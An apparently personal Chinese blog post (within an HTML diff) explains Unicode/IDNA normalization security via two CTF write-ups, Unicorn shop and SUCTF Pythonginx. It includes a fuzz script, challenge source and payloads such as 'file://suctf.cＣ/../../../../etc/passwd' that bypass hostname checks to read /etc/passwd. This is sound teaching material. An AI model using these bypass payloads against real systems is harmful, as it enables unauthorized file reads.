@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>浅析Unicode安全 | 过客</title>
+<meta name="description" content="this is a test Web">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://guokeya.github.io/favicon.ico?v=1582185509296">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://guokeya.github.io">
+        <img src="https://guokeya.github.io/images/avatar.png?v=1582185509296" class="site-logo">
+        <h1 class="site-title">过客</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      this is a test Web
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://guokeya.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">浅析Unicode安全</h2>
+            <div class="post-date">2020-01-04</div>
+            
+            <div class="post-content">
+              <p>源于Black hat 2019的一个议题。刷题的时候也出现了这类知识点<br>
+<code>https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</code><br>
+然而。全英文。心累</p>
+<!-- more -->
+<p><strong>大概</strong><br>
+给出了𓀬.net这样的网址。但是会解析成http://xn--fq7d.net/<br>
+为什么呢。这就需要从编码解码开始将<br>
+1:IDN<br>
+国际化域名IDNS。就是非英文表示的域名。比如菜.cn这种<br>
+2:Punycode<br>
+是一种表示Unicdoe码和Ascii码的字符集。例如<br>
+münchen会编码成mnchen-3ya<br>
+在IDNS推出以后。为了保证兼容以前的DNS。所以对非英语的字符进行punycode转码。转码后的punycode由26个字母+10个数字和-组成<br>
+IDN编码过程</p>
+<pre><code>Unicode ➔ ASCII – A Two Step Process
+1:Normalization（标准化）
+将字符转换为“标准格式”。
+我感觉更像格式化。把各种各样各地的字符转换成一个标准形式。
+2: Punycoding
+将Unicode转换为ASCII
+在经过Normalization这个部分时。有些字符直接变成ASCII码。如果再Punycoding。那么没啥区别。还是ASCII码
+</code></pre>
+<p>这个a/c特殊字符。经过标准化后。就变成了a/c<br>
+<img src="https://guokeya.github.io/post-images/1578146026511.png" alt="" loading="lazy"><br>
+借助altman大佬的fuzz脚本。可以把类似的字符都输出出来。</p>
+<pre><code>for i in range(128,65537):
+	tmp=chr(i)
+	try:
+		res = tmp.encode('idna').decode('utf-8')
+		if(&quot;-&quot;) in res:
+			continue
+		print(&quot;U:{} A:{} ascii:{} &quot;.format(tmp,res,i))
+	except:
+		pass
+</code></pre>
+<p>可以利用grep输出unicode转换为ASCII后为3的字符<br>
+<img src="https://guokeya.github.io/post-images/1578146188481.png" alt="" loading="lazy"><br>
+<strong>具体利用以两题CTF为例</strong><br>
+<strong>BUUCTF(ASIS 2019]Unicorn shop)</strong><br>
+名字叫独角兽商店。商品有个独角兽。<br>
+<img src="https://guokeya.github.io/post-images/1578146336349.png" alt="" loading="lazy"><br>
+购买ID为1，2，3都会报错Wrong commodity!商品不对<br>
+ID为4是购买独角兽。经过测试。只能输入一个字符。<br>
+并且输入0-9任意字符。都会输出You don't have enough money!<br>
+这里就需要Unicode知识了<br>
+输入一个字符代表数字。并且字符的意义要大于1337。只要找到满足这个条件的字符。经过后台编码后。就会转换为大于1337的数字。后台进行判断就可以成功购买了<br>
+<code>https://www.compart.com/en/unicode/</code><br>
+输入条件Ten Thousand(一万。只要大于1337就行了)<br>
+<img src="https://guokeya.github.io/post-images/1578146633458.png" alt="" loading="lazy"><br>
+随便点几个。看numeric value，这个字符代表的就是数字1W<br>
+<img src="https://guokeya.github.io/post-images/1578146731763.png" alt="" loading="lazy"><br>
+复制粘贴，成功拿到flag<br>
+<img src="https://guokeya.github.io/post-images/1578146818233.png" alt="" loading="lazy"><br>
+<strong>2019suctf(Pythonginx)</strong><br>
+题目源码：右键源代码有</p>
+<pre><code>from flask import Flask, Blueprint, request, Response, escape ,render_template
+from urllib.parse import urlsplit, urlunsplit, unquote
+from urllib import parse
+import urllib.request
+
+app = Flask(__name__)
+
+# Index
+@app.route('/', methods=['GET'])
+def app_index():
+    return render_template('index.html')
+
+@app.route('/getUrl', methods=['GET', 'POST'])
+def getUrl():
+    url = request.args.get(&quot;url&quot;)
+    host = parse.urlparse(url).hostname
+    if host == 'suctf.cc':
+        return &quot;我扌 your problem? 111&quot;
+    parts = list(urlsplit(url))
+    host = parts[1]
+    if host == 'suctf.cc':
+        return &quot;我扌 your problem? 222 &quot; + host
+    newhost = []
+    for h in host.split('.'):
+        newhost.append(h.encode('idna').decode('utf-8'))
+    parts[1] = '.'.join(newhost)
+    #去掉 url 中的空格
+    finalUrl = urlunsplit(parts).split(' ')[0]
+    host = parse.urlparse(finalUrl).hostname
+    if host == 'suctf.cc':
+        return urllib.request.urlopen(finalUrl).read()
+    else:
+        return &quot;我扌 your problem? 333&quot;
+
+if __name__ == &quot;__main__&quot;:
+    app.run(host='0.0.0.0', port=80)
+</code></pre>
+<p>大致意思就是。接收我们传入的值<br>
+然后通过urlparse解析。hostname不能等于suctf.cc<br>
+然后将其分割。取第二个值。不能等于suctf.cc<br>
+最后将值utf-8解码。等于suctf.cc，就会读取我们传入的值<br>
+每次处理的结果如下。<br>
+<img src="https://guokeya.github.io/post-images/1578147531827.png" alt="" loading="lazy"><br>
+测试源码</p>
+<pre><code>import urllib
+from urllib import parse
+from urllib.parse import urlsplit,urlunsplit
+url='file://suctf.cc/../../../../../../etc/passwd'
+host=parse.urlparse(url).hostname
+print(&quot;first host :&quot;,host)
+parts=list(urlsplit(url))
+print (parts)
+host=parts[1]
+print(&quot;Second host :&quot;,host)
+newhost=[]
+for h in host.split('.'):
+    newhost.append(h.encode('idna').decode('utf-8'))
+parts[1]='.'.join(newhost)
+finaurl=urlunsplit(parts).split(' ')[0]
+host=parse.urlparse(finaurl).hostname
+print(&quot;end host :&quot;,host)
+</code></pre>
+<p>Unicode知识。。。如果我们将其中的一个字符替换为怪异字符。前两次判断suctf.c③绕过。第三次ASCII转码后变成3。满足条件。执行我们的file://suctf.cc/../../../../etc/passwd，即可读取文件<br>
+利用文章开头的FUZZ脚本。我们找到ASCII后为c的特殊字符<br>
+<img src="https://guokeya.github.io/post-images/1578148878500.PNG" alt="" loading="lazy"><br>
+构造payload:file://suctf.cＣ/../../../../etc/passwd<br>
+<img src="https://guokeya.github.io/post-images/1578148934514.PNG" alt="" loading="lazy"><br>
+读取nginx文件，发现flag地址<br>
+<img src="https://guokeya.github.io/post-images/1578149035409.PNG" alt="" loading="lazy"><br>
+读取，拿到flag<br>
+<img src="https://guokeya.github.io/post-images/1578149080906.PNG" alt="" loading="lazy"><br>
+还有一种非预期解法：<br>
+parse是解析URL的。PHP上parse能通过/来干扰解码结果，python中也可以<br>
+当url为file:////suctf.cc/../../../../../etc/passwd<br>
+前两个解析结果为NULL，最后解析为suctf。同样绕过了判断<br>
+<img src="https://guokeya.github.io/post-images/1578149234523.PNG" alt="" loading="lazy"><br>
+以下是每步的解析结果<br>
+<img src="https://guokeya.github.io/post-images/1578149519508.PNG" alt="" loading="lazy"></p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://guokeya.github.io/tag/CTF/" class="tag">
+                    CTF
+                  </a>
+                
+                  <a href="https://guokeya.github.io/tag/Web/" class="tag">
+                    Web安全
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://guokeya.github.io/post/wJqAq8fzp/">
+                  <h3 class="post-title">
+                    Pwn(格式化字符串漏洞)
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
